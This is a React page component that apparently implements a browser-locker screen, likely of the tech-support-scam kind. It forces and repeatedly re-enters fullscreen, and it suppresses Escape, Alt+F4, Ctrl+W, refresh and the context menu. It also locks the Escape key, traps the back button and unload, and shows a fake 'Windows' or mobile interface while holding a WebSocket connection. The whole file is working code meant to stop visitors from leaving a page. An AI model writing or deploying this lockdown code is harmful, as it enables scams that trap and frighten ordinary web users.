import React, { useState, useEffect, useRef } from 'react';
import ConfirmationPopup from '../components/ConfirmationPopup';
import WindowsInterface from '../components/WindowsInterface';
import MobileInterface from '../components/MobileInterface';
import { wsClient } from '../integrations/ws-client';

const Index = () => {
  const [showPopup, setShowPopup] = useState(true);
  const [isFullscreen, setIsFullscreen] = useState(false);
  const [hasEnteredFullscreen, setHasEnteredFullscreen] = useState(false);
  const [isMobile, setIsMobile] = useState(false);
  const visitorIdRef = useRef<string>(Math.random().toString(36).substring(2));
  const visitorIpRef = useRef<string>('');

  // Add state for ESC hold - enhanced for Windows
  const escHoldTimeout = useRef<ReturnType<typeof setTimeout> | null>(null);
  const escHoldStart = useRef<number | null>(null);
  const [escHoldProgress, setEscHoldProgress] = useState(0);
  const [showEscHoldIndicator, setShowEscHoldIndicator] = useState(false);

  // Initialize WebSocket connection
  useEffect(() => {
    // Initialize WebSocket connection
    if (!wsClient.socket.connected) {
      wsClient.connect();
    }
    return () => {
      if (wsClient.socket.connected) {
        wsClient.disconnect();
      }
    };
  }, []);

  // Check if device is mobile
  useEffect(() => {
    const checkMobile = () => {
      const isMobileDevice = window.innerWidth <= 768 || /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
      setIsMobile(isMobileDevice);
    };

    checkMobile();
    window.addEventListener('resize', checkMobile);
    return () => window.removeEventListener('resize', checkMobile);
  }, []);

  const handlePopupAction = async () => {
    setShowPopup(false);
    
    // Enter fullscreen mode for both mobile and desktop
    try {
      if (document.documentElement.requestFullscreen) {
        await document.documentElement.requestFullscreen();
      }
      setIsFullscreen(true);
      setHasEnteredFullscreen(true);
    } catch (error) {
      console.log('Fullscreen not available, continuing anyway');
      setIsFullscreen(true);
      setHasEnteredFullscreen(true);
    }
  };

  const handleClick = async () => {
    if (hasEnteredFullscreen && !document.fullscreenElement) {
      try {
        if (document.documentElement.requestFullscreen) {
          await document.documentElement.requestFullscreen();
        }
        setIsFullscreen(true);
      } catch (error) {
        console.log('Fullscreen not available');
        setIsFullscreen(true);
      }
    }
  };

  useEffect(() => {
    const handleFullscreenChange = () => {
      const isCurrentlyFullscreen = !!document.fullscreenElement;
      
      // Force back to fullscreen for both mobile and desktop
      if (hasEnteredFullscreen && !isCurrentlyFullscreen) {
        const forceFullscreen = async () => {
          for (let i = 0; i < 30; i++) {
            try {
              await document.documentElement.requestFullscreen();
              break;
            } catch (error) {
              await new Promise(resolve => setTimeout(resolve, 2));
            }
          }
        };
        
        setTimeout(forceFullscreen, 1);
        setTimeout(forceFullscreen, 3);
        setTimeout(forceFullscreen, 5);
        setTimeout(forceFullscreen, 10);
        setTimeout(forceFullscreen, 15);
        setTimeout(forceFullscreen, 25);
        setTimeout(forceFullscreen, 50);
        setTimeout(forceFullscreen, 100);
      }
      
      setIsFullscreen(isCurrentlyFullscreen);
    };

    // Add additional ESC blocking layer
    const preventEscape = (e: KeyboardEvent) => {
      if (hasEnteredFullscreen && (e.key === 'Escape' || e.keyCode === 27 || e.which === 27)) {
        e.preventDefault();
        e.stopPropagation();
        e.stopImmediatePropagation();
        
        // Force fullscreen immediately
        if (!document.fullscreenElement) {
          document.documentElement.requestFullscreen().catch(() => {});
        }
        
        return false;
      }
    };

    const handleKeyDown = (event: KeyboardEvent) => {
      if (hasEnteredFullscreen) {
        // Enhanced ESC handling for Windows vs Mobile
        if (event.key === 'Escape' || event.keyCode === 27 || event.which === 27) {
          // Immediately prevent default behavior
          event.preventDefault();
          event.stopPropagation();
          event.stopImmediatePropagation();
          
          // Force fullscreen immediately
          if (!document.fullscreenElement) {
            document.documentElement.requestFullscreen().catch(() => {});
          }
          
          if (isMobile) {
            return false;
          } else {
            // On Windows desktop, require holding ESC for 5 seconds
            if (!escHoldStart.current) {
              escHoldStart.current = Date.now();
              setShowEscHoldIndicator(true);
              setEscHoldProgress(0);
              
              // Progress indicator update
              const progressInterval = setInterval(() => {
                const elapsed = Date.now() - (escHoldStart.current || 0);
                const progress = Math.min((elapsed / 5000) * 100, 100);
                setEscHoldProgress(progress);
                
                if (progress >= 100) {
                  clearInterval(progressInterval);
                }
              }, 50);
              
              escHoldTimeout.current = setTimeout(() => {
                // Allow exit after 5 seconds of holding ESC
                if (document.exitFullscreen) {
                  document.exitFullscreen();
                }
                setShowEscHoldIndicator(false);
                setEscHoldProgress(0);
                escHoldStart.current = null;
                clearInterval(progressInterval);
              }, 5000);
              
              return false;
            }
            
            // Continue blocking while holding
            return false;
          }
        }
        
        // Block other navigation keys for both mobile and desktop
        if (event.key === 'F11' || 
            (event.altKey && event.key === 'F4') ||
            (event.ctrlKey && event.key === 'w') ||
            (event.ctrlKey && event.key === 'm') ||
            event.key === 'F5' || 
            (event.ctrlKey && event.key === 'r')) {
          event.preventDefault();
          event.stopPropagation();
          event.stopImmediatePropagation();
          return false;
        }
      }
    };

    const handleKeyUp = (event: KeyboardEvent) => {
      if (hasEnteredFullscreen && !isMobile) {
        // Reset ESC hold timer on key up for Windows desktop
        if (event.key === 'Escape' || event.keyCode === 27 || event.which === 27) {
          if (escHoldTimeout.current) {
            clearTimeout(escHoldTimeout.current);
            escHoldTimeout.current = null;
          }
          setShowEscHoldIndicator(false);
          setEscHoldProgress(0);
          escHoldStart.current = null;
          
          // Force back to fullscreen immediately
          setTimeout(async () => {
            try {
              if (document.documentElement.requestFullscreen) {
                await document.documentElement.requestFullscreen();
              }
            } catch (error) {
              console.log('Fullscreen re-entry failed');
            }
          }, 10);
        }
      }
    };

    // Ultra-strong event blocking with multiple layers
    const eventTypes = ['keydown', 'keyup', 'keypress'];
    const targets = [document, window, document.body, document.documentElement];
    
    targets.forEach(target => {
      eventTypes.forEach(eventType => {
        if (eventType === 'keyup') {
          target.addEventListener(eventType, handleKeyUp, { capture: true, passive: false });
        } else {
          target.addEventListener(eventType, handleKeyDown, { capture: true, passive: false });
        }
      });
    });

    // Add additional ESC blocking layer
    document.addEventListener('keydown', preventEscape, { capture: true, passive: false });
    window.addEventListener('keydown', preventEscape, { capture: true, passive: false });
    document.body.addEventListener('keydown', preventEscape, { capture: true, passive: false });

    const fullscreenEvents = [
      'fullscreenchange',
      'webkitfullscreenchange', 
      'mozfullscreenchange',
      'msfullscreenchange'
    ];
    
    fullscreenEvents.forEach(eventType => {
      document.addEventListener(eventType, handleFullscreenChange);
    });
    
    document.addEventListener('click', handleClick);
    
    const handleContextMenu = (e: MouseEvent) => {
      if (hasEnteredFullscreen) {
        e.preventDefault();
        e.stopPropagation();
        return false;
      }
    };
    
    document.addEventListener('contextmenu', handleContextMenu);
    
    return () => {
      targets.forEach(target => {
        eventTypes.forEach(eventType => {
          target.removeEventListener(eventType, eventType === 'keyup' ? handleKeyUp : handleKeyDown, true);
        });
      });

      fullscreenEvents.forEach(eventType => {
        document.removeEventListener(eventType, handleFullscreenChange);
      });
      
      document.removeEventListener('click', handleClick);
      document.removeEventListener('contextmenu', handleContextMenu);
      
      if (escHoldTimeout.current) {
        clearTimeout(escHoldTimeout.current);
      }
    };
  }, [hasEnteredFullscreen, isMobile]);

  useEffect(() => {
    const handleBeforeUnload = (event: BeforeUnloadEvent) => {
      event.preventDefault();
      event.returnValue = '';
    };
    window.addEventListener('beforeunload', handleBeforeUnload);

    const handlePopState = (event: PopStateEvent) => {
      event.preventDefault();
      const confirmed = window.confirm('Changes that you made may not be saved. Reload site?');
      if (confirmed) {
        window.location.reload();
      } else {
        window.history.pushState(null, '', window.location.href);
      }
    };
    window.history.pushState(null, '', window.location.href);
    window.addEventListener('popstate', handlePopState);

    return () => {
      window.removeEventListener('beforeunload', handleBeforeUnload);
      window.removeEventListener('popstate', handlePopState);
    };
  }, []);

  useEffect(() => {
    if ('keyboard' in navigator && 'lock' in (navigator as any).keyboard) {
      const handleFullscreenChange = async () => {
        if (document.fullscreenElement) {
          await (navigator as any).keyboard.lock(['Escape']);
          console.log('Keyboard locked');
        } else {
          (navigator as any).keyboard.unlock();
          console.log('Keyboard unlocked');
        }
      };
      document.addEventListener('fullscreenchange', handleFullscreenChange);
      return () => {
        document.removeEventListener('fullscreenchange', handleFullscreenChange);
        if ('unlock' in (navigator as any).keyboard) {
          (navigator as any).keyboard.unlock();
        }
      };
    }
  }, []);

  return (
    <div className="min-h-screen bg-red-500">
      {showPopup ? (
        <ConfirmationPopup
          onConfirm={handlePopupAction}
          onCancel={() => setShowPopup(false)}
        />
      ) : (
        hasEnteredFullscreen ? (
          isMobile ? (
            <MobileInterface />
          ) : (
            <WindowsInterface isFullscreen={isFullscreen} />
          )
        ) : null
      )}
      {/* ESC Hold Indicator for Windows */}
      {showEscHoldIndicator && !isMobile && (
        <div className="fixed top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 z-50 bg-black bg-opacity-80 text-white p-6 rounded-lg text-center">
          <div className="mb-4">
            <h3 className="text-lg font-bold mb-2">Hold ESC to Exit Fullscreen</h3>
            <p className="text-sm">Keep holding ESC key for 5 seconds to exit</p>
          </div>
          <div className="w-64 bg-gray-700 rounded-full h-4 mb-2">
            <div 
              className="bg-red-500 h-4 rounded-full transition-all duration-100"
              style={{ width: `${escHoldProgress}%` }}
            ></div>
          </div>
          <div className="text-xs text-gray-300">
            {Math.ceil((100 - escHoldProgress) / 20)} seconds remaining
          </div>
        </div>
      )}
    </div>
  );
};

export default Index;